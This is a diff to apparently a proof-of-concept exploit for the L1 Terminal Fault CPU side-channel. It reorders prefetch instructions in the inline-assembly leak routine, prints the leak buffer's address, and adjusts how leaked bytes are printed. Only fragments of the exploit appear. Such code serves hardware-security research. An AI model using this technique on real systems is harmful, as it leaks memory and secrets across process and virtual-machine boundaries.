@@ -66,8 +66,8 @@ uint8_t l1tf(void *leak_addr, reload_buffer_t reload_buffer) {
                "and $0x0f, %%rbx\n"
                "shl $0x8, %%rax\n"
                "shl $0xc, %%rbx\n"
-               "prefetcht0 (%[nibble1], %%rax)\n"
                "prefetcht0 (%[nibble0], %%rbx)\n"
+               "prefetcht0 (%[nibble1], %%rax)\n"
                "mfence\n"
                "loop:\n"
                "pause\n"
@@ -136,6 +136,7 @@ int main(int argc, char *argv[argc]) {
   fprintf(stderr, "Request leak and reload buffers\n");
   void *leak = mmap(NULL, PAGE_SIZE, PROT_WRITE | PROT_READ,
                     MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
+  fprintf(stderr, "Leak addr is %p\n", leak);
   assert(leak != MAP_FAILED);
 
   reload_buffer_t *reload_buffer =
@@ -175,10 +176,9 @@ int main(int argc, char *argv[argc]) {
     }
 
     for (size_t i = 0; i < length; ++i) {
-      // if (isalnum(results[i])) {
+      // if (isalnum(results[i]))
+      // fprintf(stderr, "%c", results[i]);
       printf("%02x ", results[i]);
-      // printf("%c", results[i]);
-      // }
     }
     printf("\r");
   }
